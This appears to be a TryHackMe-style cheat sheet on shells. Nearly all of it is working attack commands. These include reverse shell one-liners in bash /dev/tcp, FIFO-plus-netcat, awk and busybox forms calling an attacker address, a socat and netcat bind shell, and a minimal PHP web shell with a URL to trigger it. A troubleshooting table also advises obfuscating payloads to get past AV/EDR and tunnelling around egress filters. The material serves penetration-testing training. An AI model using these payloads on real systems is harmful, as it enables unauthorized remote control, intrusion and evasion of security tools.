## TL;DR
- **Reverse shell**: Target connects **back to you** (works when egress is open).  
  - Listener (attacker): `rlwrap nc -lvnp 4444`  
  - Payload (bash): `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`
- **Bind shell**: Target **listens**, you connect (use when inbound to target is reachable but egress is filtered).  
  - Target: `socat TCP-LISTEN:8080,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`  
  - Attacker: `nc -nv TARGET_IP 8080`
- **Web shell**: Minimal HTTP wrapper to run OS commands or stage a reverse shell.  
  - PHP mini-shell: `<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>`
- **Stabilize TTY** after landing a shell:  
  1) `python3 -c 'import pty; pty.spawn("/bin/bash")'`  
  2) (local) `stty raw -echo; fg` → (remote) `reset; export TERM=xterm-256color`
- Prefer **socat/FIFO** methods when `nc -e` isn’t available; use **443/80** if outbound filtering blocks high ports.

## Gotchas
| Symptom | Likely Cause | Quick Fix |
|---|---|---|
| No callback arrives | Wrong IP (VPN vs. local), wrong port, egress blocked | Verify `ATTACKER_IP` (`ip a`), listen on `443/80`, `tcpdump -nni any port 4444` to confirm traffic |
| Shell connects then dies | `nc` lacks `-e`, no PTY | Use FIFO reverse: `mkfifo` one-liner, or `socat ... EXEC:/bin/bash,pty,...` then stabilize |
| Backspace/Ctrl-C/arrows broken | No TTY | `python3 -c 'import pty; pty.spawn("/bin/bash")'`; local: `stty raw -echo; fg`; remote: `export TERM=xterm-256color` |
| AV/EDR kills payload | Known strings/behavior | Change port, obfuscate/encode, stage via web shell, slow command cadence, try `socat` instead of `nc` |
| Bind shell unreachable | Inbound filter/NAT | Prefer reverse shells; or tunnel (SSH `-R`, `chisel`, `socat`) |
| HTTPS proxy only | Direct TCP blocked | Pivot via app features/SSRF, or use HTTP(S)-compatible channels |
| Windows target | *nix payloads fail | Use PowerShell reverse shell or compatible `nc.exe/socat.exe` |
| “Works in lab A, not B” | Interface/route mismatch | Confirm route: listener bound and reachable on the **right interface** (e.g., `tun0`), not `lo` |

# Shells Overview — Cheat Sheet (THM)

> Quick commands and notes for reverse shells, bind shells, listeners, and web shells.

## Reverse shells

**Listener (attacker):**

```bash
nc -lvnp 443
```

Listens on TCP/443 and waits for the target to call back. 

**Generic “pipe” reverse shell (target → attacker):**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

Creates a FIFO, runs an interactive shell, pipes I/O through `nc` to your listener, and feeds output back into the FIFO for bi-directional comms. 

**Examples from the room:**

```bash
# Example payload shown in the notes
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.48.111.64 4444 >/tmp/f
```



**Other one-liners**

* **AWK reverse shell**

  ```bash
  awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443"; while(42){do{printf "shell>" |& s; s |& getline c; if(c){ while((c |& getline)>0) print $0 |& s; close(c)}} while(c!="exit"); close(s)}}' /dev/null
  ```

  Uses AWK’s TCP to call back to the attacker and shuttle command I/O. 
* **BusyBox reverse shell**

  ```bash
  busybox nc ATTACKER_IP 443 -e sh
  ```

  BusyBox’s `nc` connects and executes `/bin/sh`.

## Bind shells

**Set up bind shell on the target:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Target listens on 0.0.0.0:8080 and exposes `bash` when a client connects. (Ports <1024 need root.)  

**Connect from attacker:**

```bash
nc -nv TARGET_IP 8080
```

Disable DNS (`-n`) and be verbose (`-v`) when connecting.

* **Netcat (nc/ncat)** is the go-to listener for reverse shells; typical usage shown above.

## Web shells

**What they are:** Scripts (PHP/ASP/JSP/CGI, etc.) executed by the web server to run OS commands on behalf of the attacker. 

**Minimal PHP web shell:**

```php
<?php
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
```

Upload (via file upload/LFI/command injection/etc.), then run:

```
http://victim.com/uploads/shell.php?cmd=whoami
```



**Popular PHP web shells:**

* p0wny-shell (single-file) — remote command exec. 
* b374k shell — file management + exec. 
* c99 shell — feature-rich. 
  (More collections at r57shell.)

## Quick workflow recap

1. **Reverse shell path:**

   * Start listener on attacker: `nc -lvnp 443`. 
   * Trigger reverse shell payload on target (bash/awk/busybox examples above).   
   * You should receive a shell back (see sample output). 

2. **Bind shell path:**

   * Start bind shell on the target (FIFO+`nc -l`). 
   * Connect from attacker: `nc -nv TARGET_IP 8080`.
